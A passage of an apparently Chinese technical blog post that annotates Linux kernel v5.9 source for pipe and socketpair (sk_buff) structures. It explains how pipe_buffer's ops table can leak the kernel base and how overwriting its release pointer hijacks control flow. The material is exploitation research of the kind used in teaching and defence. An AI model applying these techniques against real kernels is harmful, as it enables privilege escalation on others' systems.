class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//出错的话则会释放掉，具体干啥的不太清楚</span></span><br><span class="line">out_free_uid:</span><br><span class="line">	free_uid(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>相关的<code>pipe_inode_info</code>结构如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files;<span class="comment">//文件描述符计数，都为0时才会释放管道</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="comment">//pipe_buffer数组,16个,每个大小为0xa0,通常我们从这上面泄露地址或者劫持程序流</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-2"   >
          <a href="#②释放-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-2" class="headerlink" title="②释放"></a>②释放</h4>
      <p>直接使用<code>close</code>函数释放管道相关的文件描述符fd两端。</p>
<p>函数链调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()-&gt;put_pipe_info()-&gt;free_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>需要注意的时，在<code>put_pipe_info</code>函数中</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">put_pipe_info</span><span class="params">(struct inode *inode, struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> kill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;inode-&gt;i_lock);</span><br><span class="line">	<span class="keyword">if</span> (!--pipe-&gt;files) &#123;</span><br><span class="line">		inode-&gt;i_pipe = <span class="literal">NULL</span>;</span><br><span class="line">		kill = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;inode-&gt;i_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当files为0才会进入该函数</span></span><br><span class="line">	<span class="keyword">if</span> (kill)</span><br><span class="line">		free_pipe_info(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>只有<code>pipe_inode_info</code>这个管理结构中的<code>files</code>成员为0，才会进行释放，也就是管道两端都关闭掉才行。</p>
<p>相关释放函数<code>free_pipe_info</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pipe_info</span><span class="params">(struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//和管道相关的释放有关，也是相关的漏洞点</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//释放pipe_buffer数组,kmalloc-1024</span></span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">    <span class="comment">//释放pipe_inode_info管理结构,kmalloc-192</span></span><br><span class="line">	kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-利用-1"   >
          <a href="#3-利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用-1" class="headerlink" title="(3)利用"></a>(3)利用</h3>
      
        <h4 id="①信息泄露"   >
          <a href="#①信息泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#①信息泄露" class="headerlink" title="①信息泄露"></a>①信息泄露</h4>
      <p><code>pipe_buffer</code>结构的<code>buf</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>其中的<code>ops</code>成员，即<code>struct pipe_buf_operations</code>结构的<code>pipe-&gt;bufs[i]-&gt;ops</code>，其中保存着全局的函数表，可通过这个来泄露内核基地址，相关结构如下所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②劫持程序流"   >
          <a href="#②劫持程序流" class="heading-link"><i class="fas fa-link"></i></a><a href="#②劫持程序流" class="headerlink" title="②劫持程序流"></a>②劫持程序流</h4>
      <p>当关闭了管道的两端时，调用到<code>free_pipe_info</code>函数，在清理<code>pipe_buffer</code>时进入如下判断：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">    pipe_buf_release(pipe, buf);</span><br></pre></td></tr></table></div></figure>

<p>当管道中存在未被读取的数据时，即我们需要调用<code>write</code>向管道的写入端写入数据</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">    buf-&gt;page = page;</span><br><span class="line">    buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">    buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后不要将数据全部读取出来，如果全部读取出来的话，那么在<code>read</code>对应的<code>pipe_read</code>函数中就会如下情况</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_read</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">        pipe_buf_release(pipe, buf);</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>从而调用<code>pipe_buf_release</code>将<code>buf-&gt;ops</code>清空。</p>
<p>🔺注：（其实这里既然调用到了<code>pipe_buf_release</code>函数，那么我们直接通过<code>read</code>将管道<code>pipe</code>中的所有数据读取出来，其实也能执行该<code>release</code>函数指针的，从而劫持程序控制流的。）</p>
<p>那么接着上述的情况，那么在关闭两端时<code>buf-&gt;ops</code>这个函数表就会存在</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png" alt="image-20220509192251738"></p>
<p>而当<code>buf-&gt;ops</code>这个函数表存在时，关闭管道符两端进入上述判断之后，就会调用到其中的<code>pipe_buf_release</code>函数，该函数会调用到这个<code>buf-&gt;ops</code>函数表结构下对应的<code>relase</code>函数指针，该指针在上述的<code>pipe_buf_operations</code>结构中有提到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png" alt="image-20220509193945468"></p>
<p>那么如果劫持了<code>buf-&gt;ops</code>这个函数表，就能控制到<code>release</code>函数指针，从而劫持控制流程。</p>
<p>不过<code>pipe</code>管道具体的保存的数据放在哪里，还是不太清楚，听<code>bsauce</code>说是在<code>struct pipe_buffer</code>结构下<code>buf</code>的<code>page</code>里面，但是没有找到，后续还需要继续看看，先mark一下。这样也可以看出来，每写入一条信息时，内核的<code>kmalloc</code>对应的堆内存基本是不发生变化的，与下面提到的<code>sk_buff</code>有点不同。</p>

        <h2 id="3-sk-buff—kmalloc-512及以上"   >
          <a href="#3-sk-buff—kmalloc-512及以上" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-sk-buff—kmalloc-512及以上" class="headerlink" title="3.sk_buff—kmalloc-512及以上"></a>3.sk_buff—kmalloc-512及以上</h2>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40039738/article/details/81095013" >(31条消息) socketpair的用法和理解_雪过无痕_的博客-CSDN博客_socketpair</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>和该结构体相关的是一个<code>socketpair</code>系统调用这个也算是<code>socket</code>网络协议的一种，但是是在本地进程之间通信的，而非在网络之间的通信。说到底，这个其实和<code>pipe</code>非常像，也是一个进程间的通信手段。不过相关区分如下：</p>
<ul>
<li>数据传输模式<ul>
<li><code>pipe</code>：单工，发送端<code>fd[1]</code>发送数据，接收端<code>fd[0]</code>接收数据</li>
<li><code>socketpair</code>：全双工，同一时刻两端均可发送和接收数据，无论信道中的数据是否被接收完毕。</li>
</ul>
</li>
<li>模式<ul>
<li><code>pipe</code>：由<code>flag</code>来定义不同模式</li>
<li><code>socketpair</code>：默认阻塞状态</li>
</ul>
</li>
</ul>
<p>此外在《Linux系统编程手册》一书中提到，<code>pipe()</code>函数实际上被实现成了一个对<code>socketpair</code>的调用。</p>

        <h3 id="1-使用方法-2"   >
          <a href="#1-使用方法-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法-2" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建-3"   >
          <a href="#①创建-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-3" class="headerlink" title="①创建"></a>①创建</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//默认必须</span></span><br><span class="line"><span class="keyword">int</span> socket_fd[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//domain参数必须被指定为AF_UNIX,不同的</span></span><br><span class="line"><span class="keyword">int</span> sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socket_fd);</span><br><span class="line"><span class="keyword">if</span>( sockPair_return &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror( <span class="string">&quot;socketpair()&quot;</span> );</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后和<code>pipe</code>管道一样，使用<code>write/read</code>即可，不过这个的fd两端都可以写入读取，但是消息传递的时候一端写入消息，就需要从另一端才能把消息读取出来</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(socket_fd[<span class="number">0</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(socket_fd[<span class="number">1</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="②释放-3"   >
          <a href="#②释放-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-3" class="headerlink" title="②释放"></a>②释放</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(socket_fd[<span class="number">0</span>]);</span><br><span class="line">close(socket_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>可以看到和<code>pipe</code>是很相似的。</p>

        <h3 id="2-内存分配与释放-2"   >
          <a href="#2-内存分配与释放-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放-2" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      <p>在调用<code>socketpair</code>这个系统调用号时，并不会进行相关的内存分配，只有在使用<code>write</code>来写入消息，进行数据传输时才会分配。</p>

        <h4 id="①分配-1"   >
          <a href="#①分配-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①分配-1" class="headerlink" title="①分配"></a>①分配</h4>
      <p>在调用<code>write</code>进行数据写入时</p>
<p>函数链：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write -&gt; ksys_write() -&gt; vfs_write() -&gt; new_sync_write() -&gt; call_write_iter() -&gt; sock_write_iter() -&gt; sock_sendmsg() -&gt; sock_sendmsg_nosec() -&gt; unix_stream_sendmsg()-&gt;内存申请/数据复制</span><br></pre></td></tr></table></div></figure>

<p>在<code>unix_stream_sendmsg</code>开始分叉</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_sendmsg</span><span class="params">(struct socket *sock, struct msghdr *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">other</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> err, size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	<span class="keyword">int</span> sent = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">scm_cookie</span> <span class="title">scm</span>;</span></span><br><span class="line">	<span class="keyword">bool</span> fds_sent = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">int</span> data_len;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">	<span class="keyword">while</span> (sent &lt; len) &#123;</span><br><span class="line">		size = len - sent;</span><br><span class="line">		<span class="comment">/* Keep two messages in the pipe so it schedules better */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, (sk-&gt;sk_sndbuf &gt;&gt; <span class="number">1</span>) - <span class="number">64</span>);</span><br><span class="line">		<span class="comment">/* allow fallback to order-0 allocations */</span></span><br><span class="line">		size = <span class="keyword">min_t</span>(<span class="keyword">int</span>, size, SKB_MAX_HEAD(<span class="number">0</span>) + UNIX_SKB_FRAGS_SZ);</span><br><span class="line">		data_len = <span class="keyword">max_t</span>(<span class="keyword">int</span>, <span class="number">0</span>, size - SKB_MAX_HEAD(<span class="number">0</span>));</span><br><span class="line">		data_len = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_ALIGN(data_len));</span><br><span class="line">        <span class="comment">//------------------分叉一:内存申请部分</span></span><br><span class="line">		skb = sock_alloc_send_pskb(sk, size - data_len, data_len,</span><br><span class="line">					   msg-&gt;msg_flags &amp; MSG_DONTWAIT, &amp;err,</span><br><span class="line">					   get_order(UNIX_SKB_FRAGS_SZ));</span><br><span class="line">        <span class="comment">//相关检查部分</span></span><br><span class="line">		<span class="keyword">if</span> (!skb)</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		<span class="comment">/* Only send the fds in the first buffer */</span></span><br><span class="line">		err = unix_scm_to_skb(&amp;scm, skb, !fds_sent);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//.....</span></span><br><span class="line">        <span class="comment">//----------------------分叉二:数据复制部分</span></span><br><span class="line">		skb_put(skb, size - data_len);</span><br><span class="line">		skb-&gt;data_len = data_len;</span><br><span class="line">		skb-&gt;len = size;</span><br><span class="line">        <span class="comment">//这里开始进行数据复制</span></span><br><span class="line">		err = skb_copy_datagram_from_iter(skb, <span class="number">0</span>, &amp;msg-&gt;msg_iter, size);</span><br><span class="line">		<span class="keyword">if</span> (err) &#123;</span><br><span class="line">			kfree_skb(skb);</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">		sent += size;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sent;</span><br><span class="line">out_err:</span><br><span class="line">	scm_destroy(&amp;scm);</span><br><span class="line">	<span class="keyword">return</span> sent ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-内存申请-1"   >
          <a href="#A-内存申请-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-内存申请-1" class="headerlink" title="A.内存申请"></a>A.内存申请</h5>
      <p>先进行相关内存申请，即<code>sock_alloc_send_pskb() -&gt; alloc_skb_with_frags() -&gt; alloc_skb() -&gt; __alloc_skb()</code></p>
<p>还是挺长的，但是最重要的还是最后的<code>__alloc_skb</code>函数，</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">			    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	u8 *data;</span><br><span class="line">	<span class="keyword">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">	cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">		? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">		gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get the HEAD */</span></span><br><span class="line">    <span class="comment">//从专门的缓存池skbuff_fclone_cache/skbuff_head_cache中申请内存</span></span><br><span class="line">    <span class="comment">//作为头部的管理结构</span></span><br><span class="line">	skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~__GFP_DMA, node);</span><br><span class="line">	<span class="keyword">if</span> (!skb)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    <span 